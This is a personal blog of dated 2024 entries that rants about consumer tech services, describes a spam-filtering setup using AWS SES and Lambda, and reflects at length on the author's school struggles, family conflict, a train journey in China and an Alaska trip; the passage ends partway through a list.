every consumer facing apps or services are largely subpar and incompetent and should be replaced with a more capable option, like, Objectively. Let's list and criticize them here! One by one!\n\n### S3 compatibles vs Google Drive/Dropbox\n\nGoogle Drive and Dropbox, though using Object Storage as backend, is bad at scaling and sorting, organizing. You can scale S3 up to hundreds of TBs or even PBs with enough buckets but with Google Drive or Dropbox, nah. Furthuremore, Google occasionally put files into the Google Drive, making it largely unorganized. \n\nS3 offers more robust APIs and easier integration, allows you to easily do everything command line based with `aws-cli` or `rclone`, though `rclone` also supports Dropbox or Google Drive. Anyways, its just better at ordering and moving things around and bulk actions. You can easily integrate S3 with regular backups scripts running on cloud, but you need to do something more for occasional backups to Google Drive or Dropbox.\n\nAnyways, the whole point is S3 is easier to work with(by my experience). Also in S3 you pay for what you store, with network bandwidth and put requests costing a tiny price too, and there are different tiers like GLACIER, STANDARD_IA, and DEEP_ARCHIVE. While in those popular Drives you need to subscribe to a \"premium\".\n\n### Google Docs vs MongoDB\n\nMongoDB is a very good NoSQL document database. MongoDB is my favorite database for its ease of use. I use MongoDB to store all of my documents on my self hosted docker on EC2 and easily search in them.\n\nMongoDB offers decent performance and easy integration with NodeJS(also with other backends). You can literally control your documents and organize them so easy and quickly with scripts, and implement a backup with another Lambda serverless function into S3.\n\nMaybe I should try out Elastic some day, heard good things about it, who knows. I am not running a business and I am pretty busy so I will stick with my favorite database MongoDB.\n\n### Gmail vs SES(or email services)\n\nEmai services have robust filtering and processing methods while Gmail is largely subpar in those controls. Sure, you can write Google scripts. But then again this will force you into Google's ecosystem(which isn't universal), and any changes to that ecosystem will be disastrous.\n\n### Consumer Laptops vs EC2\n\nAny decent EC2 instance is largely much more powerful than consumer laptops, they can stay up 24/7, and have real powerful cpus. For instance, my ARM instance with 4 GB RAM and 2 CPU cores runs about 20 docker containers with ease.\n\nThere is also autoscaling in EC2, but again, I am not running a business.\n\n### Wix vs React\n\nWix is a bloated piece of crap. I mean, seriously. Wix takes a million years to load and the functionalities it allows are very bad.\n\nReact provides complete control over the application's structure and behavior. Developers can create custom components and implement any desired functionality. Wix often generates suboptimal HTML structure and can have SEO limitations.\n\n### YouTube\n\n### YouTube terminated some channels in 2024 July for their \"propaganda contents\".\n\n```\nSHAMAN, Grigory Leps, Oleg Gazmanov, Polina Gagarina\tRussian singers\tJul 2024\n```\n\nHonestly on any social media platform you don't do this kind of censorship. You can try to stop recommending them but terminating some singer's channel for no good reason is not a good idea. You can maybe also terminate all Russian contents in USA. Well these channels exist for many years and got really popular you can't \"terminate\" them suddenly without previous warnings. \n\nThere are some Obvious propagandas on YouTube that are pure evil and provides fake propaganda against China.\n\nIt is more and more like those Chinese platforms (where they regularly have large amounts of propagandas for their leaders and hate the west). But to terminate entire channels is like sanctioning US national anthem(but since USA is superpower, you know, powering the tech, respect)\n\n### Frequent Bitcoin Scams on YouTube\n\nSo there are frequently those Elon Musk deepfakes on YouTube live about bitcoin spam(that has around 100k live views and on a spoofed Tesla Channel), always about \"send one, receive two\".\n\nThese live streams got top in search results with clickbait titles like \"Musk reveals something about Trump\" or \"Musk knows Biden death\".\n\nYouTube does nothing to prevent this and let this prevail for up to 12 hours! Bruh if you wanna sanction those \"Russian Propagandas\" which I am sure no one can understand since these channels only speak in a foreign language I am sure you would want ot protect your users against those bitcoin scams?\n\nScammers are laughing at youtube with their money pouring out literally.\n\n### Phishing on YouTube Live Stream  \n\nThere are so many phishing and links in YouTube live stream from seemingly officlal channels. Some time last year I clicked into one of those websites and entered my bank card number and it was holy shit.\n\nLike literally those streams have like 100k people watching and having so many phishing links posted by the channel makes the thing very unsafe.\n\n### X\n\nX is allowing gore contents to go free without sanctioning. There are large amounts of human trafficking and tortured videos leaked on X, with links to Telegram groups and large amounts of people posting their daily criminal violent activies on the platform. When I used Twitter, it recommends these accounts to me.\n\nSocial media isn't a free place and shouldn't be, and I get it that you want to be \"free\". But allowing criminal activities to prevail isn't the best option out there, right?\n\n### Conclusion\n\nIn something called social media, I LOSE.\n\nCompanies frequently allocate their top technical talent to core infrastructure, algorithms, and research, rather than to user-facing issues like content moderation. There is no point in trying to make them better, because those consumer facing teams are simply incompetent.\n\n\n## Updates 2024.07.16\n\nBasically my Gmail started getting large amounts of spam, and it was evident they put my Gmail address in `bcc` field.\n\nThe attacker(script) uses large amounts of random addresses and domains to spam my email (tries for phishing I guess but I am not gonna get phished so it's basically like spamming attack). My inbox got flooded with spam every day, and frequently notifications ring on my phone only to discover it was a spam.\n\n### Why did this Only Happen to Me?\n\nLiterally just like every other bugs and stupid things I encountered with softwares I was like, \"Why is this always happening only to me?\" or \"Why don't others encounter the same problem? I was like frustrated and there was no solutions, but how do they find solutions(if they can find solutions). Maybe most folks out there don't encounter bugs at all or only a small fraction of the total bugs I encounter.\n\n### How to Block Spam in Gmail\n\nGmail is a very weak platform. It isn't bad because it offers free email services, and something that offers free services bad or incompetent shouldn't be negative.\n\nGmail is just incompetent as hell.\n\nWhen I tried to search on Google how to block spam nothing came out, and all I could find is block one email address(but the attacker is literally using hundreds different domains every single day).\n\nLike Gmail doesn't support wildcard blocking (WTF?? Man?).\n\nAlso, Gmail's machine learning algorithm is bad and incompetent, and it frequently lables those spam as important. Despite bearing this crap for a month and always pressing on the \"report spamming\" \"report phishing\" nothing changed. Just like any other machine learning algorithm implemented for everyone out there.\n\n### Being Really Really Irritated\n\nIt got me mad. I was like this should be done by a simple script and not to be complicated. I shouldn't have to depend on a platform to do this. Like this is literally what Python noobs learn to do, while I have no ideas how to protect myself using Gmail(stupid incompetent service)\n\nAlso, I think other email provider's filters might be better, but it wouldn't turn out to be much better probably.\n\nIronically I have to depend on some shitty frontend for email filtering(??),\n\n### Why is Gmail Subpar?\n\nGmail is subpar because it is consumer oriented, and 99 percent of consumers are computer idiots, and also the company likely hires the most incompetent people into those consumer oriented products. That's why it's subpar.\n\nMoreover, the solutions you find online are for total noobs, not powerful and granting the user control.\n\n### Not Self Hosting Email Server\n\nSo I am not self hosting email server obviously, it is not a good idea because my other servers frequently got down(which I can quickly fix) and if my email got down for a extended period there is a lot of damage.\n\nAnd I thought Hillary programmed an email server for fun which is pretty impressive lol.\n\n### Solution\n\nSo yeah, here's the solution to the problem.\n\nHook up AWS SES and configure the rules to trigger a Lambda function to process the emails as they arrive so you can add as many filters in Python as you want while also saving them into S3 for personal backup, so you never have to Google Takeout now and then.\n\nSES comes with SMTP server, but I need an IMAP server, fortunately there is AWS Workmail(the GUI isn't good), but the server is good enough so like I can proxy my inbound emails with my Lambda script to filter out the stupid headers and reject those emails.\n\nAlso don't forget to leave a message to the sender(since there might be legit senders who just happen to go into spam filters) to remind them to open an issue on any of my Github repo.\n\nUsing SES as a proxy and forwarding all inbox to SES, then utilizing Lambda script and Workmail as IMAP cleverly solves the problems without self hosting, and implements backup pretty clever.\n\n### Troubles\n\nSo I ran into a stupid trouble. I forgot to specify the MX records, and it didn't trigger the lambda function. I got ocnfused and didn't know what to do. Fortunately I find out the reason real quick.\n\nAlso you have to send with YOUR OWN EMAIL on AWS, which is a really good thing! But fix the reply to please.\n\nSomething I really hate about emails is that they can be autoforwarded(what? that is literally spoofing with someone else's email).\n\n### What Services use SES\n\nSo SES is actually quite popular, and I can send up to 14 mails per second and 50000 mails per day in a basic tier.(which I don't need a fraction of that).\n\nAmazon, Netflix and Reddit all uses SES, as well as at least 100k more companies, so like basically it is kind of the most popular mail after all(not consumer facing). Most consumer facing things are just Subpar, period.\n\n### Updates\n\nThe spamming in my Gmail miraculously stopped. I don't know why.\n\n\n## Updates 2024.7.6\n\nKey takeaway: Don't write Chinese\n\nChinese is confusing and hard to read.\n\n## Updates 2024.06.30\n\n### People Picking up My Bedsheets\n\nToday I was moving away from my apartment. When I threw my bedsheets away on the next elevator up I saw some neighbor picking everything I threw away up from the garbage bin.\n\nSo I think like they are probably not well off, like, who would pickup something from the garbage bin except those who might really find it helpful? People around me live in a different state.\n\n### Don't Bring too much\n\nNever bring anything more than 3 bags with me, or else I would have to carry at least 2 bags simultaneously(after putting one bag on the trolley case). It was a nightmare and heavy as hell.\n\n### Weird Behaviors\n\nThese days I had more and more weird behaviors I booked a no-seat ticket on a green train for 8 hours at night. I was crazy. I don't know how to navigate my behaviors at all, especially after failing in academics.\n\nI got on the green train, and man, was it terrible. I have never been on such a train for the last 10 years. Two construction peopel were sitting right on the other side of the floor, both very seasoned. It was very crowded with all those people and I had no seat. Everywhere I look there are tons of people.\n\nIt was never like the train (or high-speed trains), which made me rethink and learn more about China. Like, the country is seriously large and has lots and lots of people, it made me understand the policies much better. Like dudes in this country are nothing like me, so the policies are meant for them, not for me I think. It becomes a whole different story when you need to bring up a huge county with billions of people vs when you are a depressed isolated teenager trying to get some entertainment.\n\nIt is unthinkable for those blue-collar or heavy-labor people to go study computer science(I don't think those hard-labor people can think critically or deeply) or talk English fluently.\n\nSo I thought about those workers from to city, and I thought it was every bit true. Workers would carry huge luggages working hard labor jobs in the cities to earn some money, and would frequently sleep on the ground.\n\nI mean, there is no point in standing up all night for the sake of it because it is simply bad for my health and overwhelming the body.\n\nThere are so many people on the train and it is so crowded, and many people are standing up. (for the whole night, not even getting a seat). Many people are sitting down and on a bed(which offers more expensive prices)\n\n### Leaving the Station\n\nThen I went out of the train and left the station. When I tried to leave the station janitor asked me \"Why\", and \"What\" he was confused, so I simply replied \"Let me leave\" kindly, and he let me leave.\n\nI found my phone suddenly run out of mobile data and I went to the subway, but the subway stopped operating at literally 11 pm(it wasn't like that in Shanghai though). So like after going a few stops I got stuck in the middle of nowhere.\n\nSo I had to ask the conductor for help.\n\nThe conductor had an iPhone 15 Pro Max(bro-like, their wages are around 10000 RMB a month). He kindly offered me his hotspot and I added some mobile data from the vendor. I thanked him so much.\n\n### Changes to Attitude to Parents\n\nAnyway, this made me think about how my attitude toward my parents changed too. Previously I was like \"They don't care about my well-being\", and \"They don't care about my mental health\", because my mental health is largely concerned about my freedom, and when someone doesn't need or consider freedom to be a priority they are likely going to ignore other's need for freedom too. Many things are indifferent to me too, for example, I don't like social media, and I don't pick any foods. I can eat practically anything anywhere as long as it is prepared and enjoy it a lot(when I am hungry), so I won't give a damn when someone else complains about food. It's the same with my parents, I think, it's not that they are neglecting my well-being, it's just that they don't consider some things to be important in my well-being, (and it's not like they are neglecting on purpose because they likely don't care about it for themselves too)\n\n### Comparing Two Different Works\n\nA programmer has to work large workloads in an airconditioned house vs a worker who is working hard labor outside under sizzling heat is both unhappy and faces problems and that doesn't make the programmer's problem invalid. Switch places and both will be worse off, with the worker performing far worse on programming and the programmer likely unfit for physical labor at all. You can say that perhaps the worker might be more \"sad\"(while perceived might not even be true), but you cannot say that the programmer's problem is any easier.\n\n### What to do in Future\n\nSo for me, to fix my problems and improve my well-being, it is essential to take a constructive approach and fix them consciously instead of endlessly running and doing shit. Basically what I am doing isn't helpful and it's like no one does it on purpose to harm me or something, simply because I am unfit and need to adjust. Again, my problems are perfectly valid,(they cannot be solved by justifying the hard labored worker, or anybody, faces more terrible conditions)\n\nSo like there is no more point of going mad, or doing weird things like attempting to go on a green train(because that is both ridiculous and non-constructive).\n\n\n## Updates 2024.6.11\n\n### No Choice When I was Younger\n\nWhen I was young I didn't have any choices, or any realizations that I might have a choice, or a lot of mature ideas. I ought to be guided by adults, and that is the only way how it worked.\n\nBack then besides trusting adults, I don't know what else to do myself. Everything I knew was taught by them.\n\n### Recent Years in School\n\nIn recent years I faced significant challenges in academics, and it only intensifies each year with no signs of relief.\n\n### My Efforts to Cope--Dying Interests and Activities\n\nI tried hard to cope with school, at drastic measures. I didn't remember myself being, or identifying this strong with minimalism before.\n\nNow, disclaimer, I am not saying that these actions are wrong, some of them proved to be beneficial in the long run, with or without school. But I feel like these are forced upon me.\n\nIn my freshman year in university, I didn't use a smartphone for half a year. I looked like an idiot at that time. The school needed to test COVID with a smartphone, and I brought the ID card with me all the way. I had to use cash at the counter. I looked like a total idiot. Nobody, even nobody remotely, tried to do that. It is unheard of. I did this solely to put myself away from distraction. People would occasionally joke about not using smartphones, or take my practice as a joke, but it wasn't a joke for me, it was a serious struggle.\n\nI completely got rid of gaming. I went against it so hard I hated myself. It was no easy task, with gaming frequently crawling back and trying to dominate my time. Those days were struggles one after another, hard-fought mental battles, and occasionally losing one or two days, but then trying even harder. It was a really challenging task, but I did indeed manage to complete rip off gaming, which I was once quite addicted.\n\nI stopped reading completely. I was very enthusiastic about the literature. I would read 3-6 interesting novels monthly, mostly YA or fantasies or romances or mysteries, but not any more. I didn't read at all for 2 years. Not that literature is as bad as gaming, but it fails to appeal to me anymore. I live in this boring and mundane life, and reading literature once made me wonder, and go fly in the fantasy universe, not any more now. Things are not changing.\n\nI had no social media. No, nothing. Just, nothing. I deleted Twitter, instagram, Mastodon, Telegram. I once had them and for the sake of concentrating, removed all my contents and deleted those. I deleted all \"moments\" in WeChat.\n\nI tried at least 10 times to adjust my night owl schedule starting sophomore year. It was a failure, and up to this day I still have the night owl schedule, staying up to 3 am -6 am, just not wanting to sleep. I tried to wake up early , succeeded for a few days, then go back to the schedule again after some things start bothering me.\n\n### Callback--Trying to Start a New Life Pre-High School\n\nBack in the summer before high school, I was trying to start a new life. Ask me then and I would be very enthusiastic. \"Oh, just imagine the things I will do!\"\n\nI had 6 interests back then. I liked running, walking, Ci Poetry, Math, English Literature, Musical Instrument. I thought that balancing those with the school would be very easy, especially when half of my interests align with the school's main courses.\n\nTurns out anything but. My high school is a dictating prison.\n\nPeople never take interest seriously back there, making room for studying 15 hours a day. All my interest back then got dropped, or \"prioritized\".\n\n### High School: Frequent Failures--Lost of Control\n\nI failed frequently in Chemistry in my high school years. Despite my efforts to study and get a modest score, things never work for me. I studied Chemistry really hard in the first semester second half after getting only 60 on the mid exam, putting in the recess time and always trying to memorize those concepts, paying in significant more time. But I only got 56 on the final, failing miserably. I thought something was wrong when it didn't turn out like I wanted. I wasn't discouraged and was determined to try harder. In the winter holiday I enrolled in a cram class for 3 hours a day studying Chemistry, even paid more much effort to it than I did in math, only aiming for a modest and reasonable score, not to let it stand out, but despite getting 80 on the starting exam in the second semester, I got only 58 in the middle exam in the second semester. I did all I could, and took multiple similar tests beforehand, but still failed, again and again. At that point all hope seemed lost, and I quit the cram class and hate the subject so strongly ever since. It seemed like my efforts are unrelated to the scores, and the teacher never encouraged me or praised me, which I longed for so hard. Instead, he said in a mockery manner that those who got low scores didn't try hard and would \"obviously\" get really good scores had they genuine want to learn. I got scared of the teacher. My father first said that I was slacking off, but, after seeing me being really sad, instead, said in a playful manner maybe this is just not for me. To this day the pure mention of Chemistry would make me want to lock myself in a toilet and cry.\n\nI failed frequently in Chinese, in almost every test. I hated Chinese and the damn teacher so much. She never explained those broad or unrestrained poems well, and everyday was like, recite this and recite that, and recite everything I said. I really tried to listen to her and tried to recite those phrases, but after trying very hard, got lower and lower Chinese scores, always far from the average.\n\nCi poetry was a thing I loved. I could recite a whole book of Ci poetry with 60 pages, on any page start a line I could recite the rest of the poem. I did it out of pure passion, not because some shit teacher forced it upon me. During the conoravirus I would lean by the window, looking at the falling of the April rain, and the poetries touched me deeply. In May, as I was walking in wet grasses along the river and the blossoms of spring came, yet feeling so lonely and isolated. Those poems came naturally into my mind.\n\nBut high school Chinese makes me hate the subject so much, ahh, like, it never sparkled my interest, and I was always failing or around failing at 92 or 95 out of 150.\n\nBut the most humiliating thing is English. My English teacher in high school frequently criticized me because I wasn't \"studying hard\", and always recognizing me as a low performer in the subject needing immense help. In exams, I was frequently below average in English. The only time I got average score she said to me I done decent was even more humiliating. Now, it is an ESL country. I read more than 500 YA lit books before high school, and it was my favorite thing to do back then. Not long after leaving high school, I got 109 in TOEFL. If there was anything more unimaginable than that, I don't know.\n\nI didn't even show my English Blog in high school till the end of high school, where I wrote at least 20 book reviews. I like English so much, and I have a real passion for the language. I used to read 1 hour daily about anything in literature, immerse myself in the English only library, and dig deep into those fantasy landscapes. I was being criticized and not being recognized in something I was truly passionate about, and being frequently compared, and looked down upon as very poor in this subject.\n\nI was also poor in Biology, History, Politics, but I don't want to expand anymore. I can literally go on for ages, it's not relevant here.\n\nAnyway, long story short, I lost control, and the rest of my high school was spent in anxiety and despair.\n\nSome day last month I had a nightmare in high school, and there was an exam, I believed I did well in every subject in the exam, I was lighthearted and happy for a moment before I realized the answers betrayed me, and I failed in every one of them. It was the most vivid dream I had in a while.\n\n### Difficulties in Living in the Dorm\n\nIn my freshman year in college, I had significant challenges in living in the dorm. I was very different with my dormmates.\n\nOne of my dormmates has this strange habit of making his alarm ring as early as 6 am and not shutting his arm or getting up until like 9 am. I was always waked up by that, and it was so loud and annoying. He never acknowledged his behavior, the strange thing is, nobody else in that dorm seemed to mind it. I always thought I was a crazy person. I complained frequently and our relationship got worse because of it. I absolutely couldn't bear this behavior, and the teacher didn't understand me as well, and my parents didn't understand it, and my father noticeably said you just bear it.\n\nMy roommate was frequently lying on the bed, usually playing games aloud till around 2 or 3 am. I don't understand these kids.\n\nI had really bad sleeping disorders and always needed to sleep around 2 hours in the afternoon or mornings.\n\nI never spoke with that roommate for 6 months, not one word, because we just couldn't speak or communicate.\n\nThus living in a dorm became a nightmare ever since. In my journal after saying stating I am minimalistic, I would always \"a separate quiet room\" after that.\n\nI also had significant difficulty in military training days before school started. I started thinking that this is going to be hard to get through right away and I just didn't have the same enthusiasm. The \"officers\" only made us \"move your legs as if running, while you stay in one place\" or just \"walk\", and I did, and a short officer came to me right away, and forced me out of the formation of students, and saying I wasn't paying attention. He made me do that move for a long time while other students pointed and laughed at me like I was a weirdo. I was marginalized, and I hated the damn training even more.\n\nAnyways we seperated into small groups and the \"good\" ones got assigned into the formation group where they would walk around a cricle aligned(how freaking boring), and I got aligned to the group to wave \"flags\", and got kicked out by another \"officer\" from the group because I didn't wave the commuist flag well enough. Somehow I was able to pass the training sitting on a bench along the playground passing as those \"injured\" or \"disabled\" students. It was so lucky for me.\n\nAfter that, military training or all kinds of conscription became a nightmare for me as well. Lucky for me conscription isn't required.\n\nWhen I speak out about these matters they were always neglected and people never took them seriously, only acting like, \"Well, you seem to be crazy, maybe just do whatever you want\" attitude.\n\nThe thought that my parents understood me, and cared for my mental health shattered. Their \"promises\" are fake and ingenuine, saying \"things will turn out well\" without caring about anything. I saw no hope in them getting me out of the darkness. The fact that I thought those people cared for me, really had an idea of what's going on but made me face these things alone, frequently to an unbearing point, me barely managing to get through, only caring about exam results, it just made me lose trust in them that is forever irretrievable.\n\nBecause I was frequently backed to a corner. Their \"reassurances\" were just to put off my feelings, I felt hopeless and lonely. Interesting discovery, my parents thought I was \"fine and happy\" in my freshman year.\n\n### Reflection: What Caused the \"Incident\"\n\nThe PE teacher when he intentionally failed me on Taichi. He said, \"You didn't pay any effort.\"\n\nBack then, I didn't lose all trust in my parents or adults.\n\nIt wasn't specially targeted to the PE teacher.\n\nI got full marks in the 3000m run and pull-ups through reasonable efforts. The teacher said I failed in the first try. I practiced the crooked \"taichi\" for a whole 3 days leading up to it, sacrificing my noon time, for the second try, only aiming to get a reasonable effort. I paid a lot more effort than most people.\n\nBut he still decided to fail me there, in contrast to my full marks in running and pull-ups. I was in a hopeless and dark moment when I realized that in some situations no matter how hard I work I am always a joke. It was worse than not working at all.\n\nAt that time I was in a very very weak and vulnerable point. It was because I just couldn't hold things back anymore. That was my last straw. I did something very unreasonable. I cursed the teacher in the \"anonymous\" feedback form, and wrote something like \"die\".\n\nAnd I didn't do anything else than, quietly accepted the result, and things didn't escalate.\n\nBut on the coming semester on my 17th birthday exactly, the teacher called my parents to say they received \"harsh\" comments, and it was very very serious, turns out the form wasn't anonymous, and I got a punishment from school, but lucky for me, no serious consequences.\n\n### More Resilience--But Leading to Imposter Syndrome\n\nIn recent days, somehow I became far more resilient with criticism of teachers or feedbacks from schools. My efforts not paying off seem like norm rather than exception.\n\nI had faced significant imposter syndrome these years after efforts and seemingly perceived good work frequently turned out failing so bad. When I was trying hard to do something, I often met with failures or missing the entire point.\n\nOn the other hand, I engaged in depth in other fields even without much effort.\n\nWhen I finished coding my personal website people ignored it, but I don't really care though. At the same time, I began not to care about other people, I isolated myself from the crowd, always crouching in the lonely bedroom at my computer. I had no social media, just no.\n\nAnother thing caused me to isolate myself. On the sophomore year, it was my first attempt to participate in a coding competition, and my teammate frequently complained not able to read English. She complained every 5 seconds, and spread large negativity. I said, \"why don't you open a Microsoft Word and paste the English problems and right click on it to translate to Chinese?\" She did, and she was alleged \"cheating\" because \"going online\" isn't allowed, and everyone blamed it on me. Moreover, the crooked committee threaten to \"ban the school for 2 years\" because of the \"cheating\" incident. People I didn't know started badmouthing me and cyberbulling me in the group chat, with my parents frantically coming to help me out. Someone posted a question about this debate on the Chinese quora, \"Whether should the school be banned for 2 years?\", and it reached top 1 hottest question. There were no rules on the official website before the event, with the committee frantically adding \"rules\" to it after facing backslash. Anyways, my first \"official\" experience with competitive coding ended sadly, and I don't like competitive coding ever since.\n\nPeople didn't acknowledge my works or efforts, or, the acknowledgment never came on point, it was frequently off the point and seemingly unrelated to whatever I was doing. People praise me but for another reason, I don't like it, and most of the praise is aimed at something my parents done instead of me(Anyway, if you look at how much I have, I am not earning anything, everything I have is from my parents).\n\nOr it is aimed at something trivial. Like \"how could you understand English easily?\" or \"wow you use command line when there is GUI?\", but actually, I had equal confusion, like, \"isn't English better for telling English stories?\" or \"isn't cli much more controllable than GUI?\"\n\nThus after the imposter syndrome I also came to just completely ignore the things I am bad at, just put it off, unwilling to put any effort into those things uninteresting to me at all, and usually drift off for hours, several all-nighter at times, for the passionate or alluring things, most recently cloud computing and frontend, before that device exploration, void of everything surrounding and things happening around me. I had to force it this way because the harsh reality was just too much for me to deal with anyway.\n\nNow if the \"PE teacher Incident\" occurred again I wouldn't really care, in fact, maybe it just did happen, but I just turned a blind eye completely.\n\nI became numb, I wasn't the person I once was, who would smile and cry at remarks teachers made. Instead, I dived deep, droning out the voice around me, getting ignorant and more carefree.\n\n### Why do I Hate School So Much (Now)?\n\nThe process of hating something usually spans for a long period, and right now, noticeably, I absolutely cannot bear it anymore. The hate began as early as high(middle) school.\n\nMy parents kept bringing up straight A+ students, especially when I already worked hard and had significant mental challenges.\nThat's not going to motivate me.\n\nThat's just going to shatter my self-esteem make me realize I am worth nothing in school, and make me hate school a lot more than I already did. Lack of self-esteem is relatively easy to overcome, I had loads of experiences coping with really low self-esteem, and it's usually not a direct cause of problems.\n\nBut hatred of school is a problem. The more I thought about people performing far better than me in schoolwork, the more I realize that I was limited by school, knowing it led me nowhere, and I worth nothing here. It made me hate the homework much more, and become even more reluctant to follow the teacher.\n\nThe fact I was putting away my interests, letting other activites die, trying to focus and still bad in school made me realize I am a joke.\n\nStudying, as a result, causes great friction as I pull through. I am not quitting studying anyway, I am usually a very obedient and down-to-earth person, and I always make that decent effort to do things, even in those times when I greatly disagree with it and thought it wasn't the best thing for me to do. I still paid the same effort, only leading to less work and procrastinating more, and noticeably, began gravitating more towards other things.\n\n### What is a Successful Teenager?\n\nThere are a lot of emerging athletes in soccer, running, skating, and getting multiple awards at the age of 19. That is very successful.\n\nAlso, a promising young singer getting millions of views on YouTube is successful. A dancer, a painter, a writer.\n\n### I Learned Nothing in School\n\nI didn't learn about any valuable things in school, well that is until I visited UC Berkeley for a year. But I was also under extremely high academic pressure and unnecessarily very much in despair and self-doubt these years.\n\nThe Ch!nese school system now is an authoritarian nonsense, with people frequently underestimating its negative impacts. It's full of egregious lies and brainwashing, filled with meaningless propaganda and gaslighting.\n\nI hate school so much.\n\nTeachers here are hugely unqualified and school courses on certain topics are just boring, far more boring than self exploration.,\n\n### \"Some University CS Teachers\" in USTC Don't Understand `git`\n\nSome also never heard `docker`, `nodejs`, never used `cli`, or `API`. No more words are needed.\n\nI tried really hard to inform the teacher the system he try to make students build is very insecure and ambiguous, and lacks captcha, passhash, pepper, CSRF. But these are mild problems compared to the teacher not being aware of authentication at all, let alone least privileges! To which the TA \"kindly\" replied, \"Do whatever you want, and don't bother with us. You think difficult, you do more work.\"\n\nIn another class the teacher repeatedly refuse to help with problems on the school's Windows(which I never use of course so I don't know how to fix) desktop computer, claiming he don't know about it too, clumsily opening a few window before rebooting and out of measures, didn't seem to how to fix the bug. \"Well, you must still finish!\" he said.\n\n### Most Grownups/Teachers Aren't \"Responsible\"\n\nMost grownups don't know what they are talking about, but the problem is, they like to pretend.\n\nThe more I grew up, the more I came to realize that adults have a strikingly small knowledge base or speak contrary to reputable sources, especially in tech. They talk like they know it, and they don't correct it if people misunderstand them, or they do not have the right influences.\n\nGrownups are strikingly irresponsible in this sense.\n\nMost teachers lacked significant expertise but had a strong influence on students or the class climates.\n\n### Grownups Not Gonna Respect you Until you Get Rid of Them\n\nThere is a great power imbalance when some grownups talk to me. They seem far more superior, acting like authorities.\n\nDon't believe those grownups, don't give a damn about their promises to \"be equal and kind\", just get rid of them. Then they can treat you fairly.\n\nHigh school teachers are an example, they frequently condemn and tower over me. I feel so much better getting rid of those annoying high school teachers and getting out of the goddamn shitty high school.\n\nThese days if I go back, the high(or middle) school teachers won't treat me this way anymore, they would treat me like an old friend.\n\nMy parents are another example.\n\nWhen I came back from the United States the first day my parents had plans for me, and what I should do. They arranged for me to study car, go to a traditional Chinese doctor for bone treatment, and, while I was undecided, claim it was good for me. It failed badly. Since they had autonomy over me, I had to agree. It ended miserably with me hating their decisions, having a huge argument, my parents not taking the blame and claiming they knew better, me quitting learning to drive halfway, and me going back to Hefei quickly.\n\n### About Choices & Decisions\n\nThe ultimate reward for me is time-accumulated happiness, that is what I hope to maximize, and perhaps many other people hope to achieve in life.\n\nFor me, minimalism is an important global heuristic. Global here means static in time, and just the global being. For example, enjoying some decorations isn't going to make me happy in the long run. It does give me enjoyment today, but tomorrow I will find it ugly. Also, decorations take effort and that effort is more than the total rewards given by the decorations. Of course, I am not against decorations most of the time, but trying to keep it in a minimized, non-intrusive manner, and I am just illustrating a point. In the global sense, minimalism isn't the only heuristic, there are also other heuristics, like freedom, autonomy, and compatibility with society, that largely guide and influence my choices and decisions.\n\nFor local regions, however, practicality and no-nonsense matters more, and are important heuristics. I am not going to use a Window Manager or delete most of my laptop applications, although it makes my laptop more minimal. Aligning with mainstream or the popular choice takes less effort and causes less misunderstanding, while a strict minimum is usually niche and almost seems like an additional hobby or choir, sometimes causing it to be heavier and costier in the global sense.\n\n### Understanding Grad School--It is the \"Start\" instead of the \"End\"\n\nGrad school seems an escape from my current worries, (hopefully self-sustained) getting rid of parents, who would be thousands of miles away, having more autonomy to dive into some truly engaging things, aiming to live a truly simple and minimalistic life, and being called \"expert\" once graduated.\n\nExcept,..., right?\n\nThat remains to be known.\n\n\n\n## Updates 2024.6.8\n\nThis is a reflection on the trip on 2023.5.13-2023.5.22.\n\n### Haven't Been on Another Trip\n\nIt has been a little more than a year since I went to Alaska on that memorable trip. Since that trip, however, I have not stayed overnight on any travels. While I was even planning on going to Florida in the winter (heard nice things about that) when I was having lunch in Denali, I lost the urge later.\n\n### Not that \"Interested\" in a Trip\n\nPart of the reason might be I lost a lot of interest in traveling from going to Alaska because I fell so much in love with the winter landscapes that other places looked trivial and not that attractive.\n\nSometimes I went on trips to see scenic views, but they became no longer appealing. Nothing I had ever seen in my life was as striking as the beautiful landscapes in Alaska, those winter glaciers and mountains and rural towns.\n\n### Feeling \"Guilty\" of Using Parent's Money on Trips\n\nI spent almost 4000 dollars alone on the trip, from sky-high pricing of plane tickets to the minimum unoptimized living costs--around 150 dollars a day for 9 nights, plus doing all the regular activities, e.g., boat cruise, flightseeing, Alaska railway. A decent trip to Alaska for around 10 days would cost about 4 times the pricing of a busines-level, long-lasting laptop. It is a large amount of money, and it's from my parents, not mine.\n\nLately, I have been feeling guilty about bulk spending my parents' money, like, even if they have so much, I can't justify using it for enjoyment. I can use it to buy food, buy a phone, pay tuition, but go on a high-cost trip? That sounds unreasonable.\n\n### Too Much Pressure from School\n\nI have faced significant challenges in schoolwork these days, and I stopped having that vibrant vibe. I cut traveling to face schoolwork.\n\n\n### Drivers\n\nSo let us first reflect on the people I met on my trip. \n\n- A taxi driver(black) working at midnight hours, taking me to the hotel when I arrived at Ted Stevens, somehow he mistaken me wanting to leave without paying, started complaining loudly(scared me a bit, until I paid him)\n- A taxi driver(white) who grew up in Orange County had some houses on Airbnb, and had his children in a law school, taking me to the library in Anchorage\n- A taxi driver(not white/black/Asian) who worked with the homeless(handing them food in the winter), and urged me to get better grades, taking me back to the Airbnb in Anchorage\n- A taxi driver (not white/black/Asian), a woman individual taxi driver who worked in Seward, taking people to nearby scenic attractions and back to their hotels\n- A taxi driver(white), a young guy, driving me back to Fairbanks at past midnight\n- A taxi driver(black), Brahima, a very friendly guy, drove me from Fairbanks to North Pole and offered to take photos for me\n- A bus driver(black) in Anchorage, an old woman later came onboard and seemed confused, he generously helped her out with the elder woman saying \"You made my day\"\n- A bus driver(white) carrying me from Anchorage to Seward while making some commentaries\n- A bus driver(white), elderly guy who drives around in Seward all day long carrying people around\n- Another bus driver(white) on an ATV tour from Colorado, saying he went to all states except Hawaii, almost 50 years old and second year in Alaska\n\nThe majority of tour guides said they worked in the lower 48 most time of the year and came to Alaska only in the summer for a job. Furthermore, all drivers hired for tourist purposes are white, while some local drivers have different ethnicities. (purely personal experience)\n\n### Locals Working on Tourism(Not drivers)\n\nThen there are working local people\n\n- Receptionist for hotels, working long hours into the night\n- Receptionist for Tourist Services(mostly very young girls around 17-25 years old), checking tickets, welcoming tourists, sometimes chatting or serving tea/drinks\n- \"Static\" Tour Guides, Some people who sit in a house and provide guidance and maps, chatting with visitors\n- Luggage Delivery People(mostly young), driving around delivering/picking up luggage\n- Fast Food Waiters(mostly young, some older), fast food restaurant \"Subway\" or cheaper restaurants\n- Fancy Restaurant Waiters(mostly very young girls around 18 years old), 